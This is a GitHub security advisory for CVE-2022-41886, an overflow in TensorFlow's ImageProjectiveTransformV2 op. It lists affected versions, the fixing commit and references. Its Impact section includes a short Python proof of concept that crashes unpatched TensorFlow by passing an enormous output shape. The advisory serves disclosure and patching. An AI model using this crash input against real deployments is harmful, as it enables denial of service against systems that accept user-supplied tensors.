# [M] Overflow in `ImageProjectiveTransformV2`

## Summary
Severity: Medium
Advisory: GHSA-54pp-c6pp-7fpx
CVE: CVE-2022-41886
CWE: CWE-131
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-11-21
Source: https://github.com/advisories/GHSA-54pp-c6pp-7fpx
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.8.4
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.3
- PyPI: `tensorflow` — affected >=2.10.0 <2.10.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.8.4
- PyPI: `tensorflow-gpu` — affected >=0 <2.8.4
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.3
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.3
- PyPI: `tensorflow-cpu` — affected >=2.10.0 <2.10.1
- PyPI: `tensorflow-gpu` — affected >=2.10.0 <2.10.1

## Details
### Impact
When [`tf.raw_ops.ImageProjectiveTransformV2`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/image_ops.cc) is given a large output shape, it overflows.
```python
import tensorflow as tf

interpolation = "BILINEAR"
fill_mode = "REFLECT"
images = tf.constant(0.184634328, shape=[2,5,8,3], dtype=tf.float32)
transforms = tf.constant(0.378575385, shape=[2,8], dtype=tf.float32)
output_shape = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
tf.raw_ops.ImageProjectiveTransformV2(images=images, transforms=transforms, output_shape=output_shape, interpolation=interpolation, fill_mode=fill_mode)
```

### Patches
We have patched the issue in GitHub commit [8faa6ea692985dbe6ce10e1a3168e0bd60a723ba](https://github.com/tensorflow/tensorflow/commit/8faa6ea692985dbe6ce10e1a3168e0bd60a723ba).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-54pp-c6pp-7fpx
- https://nvd.nist.gov/vuln/detail/CVE-2022-41886
- https://github.com/tensorflow/tensorflow/commit/8faa6ea692985dbe6ce10e1a3168e0bd60a723ba
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/image_ops.cc
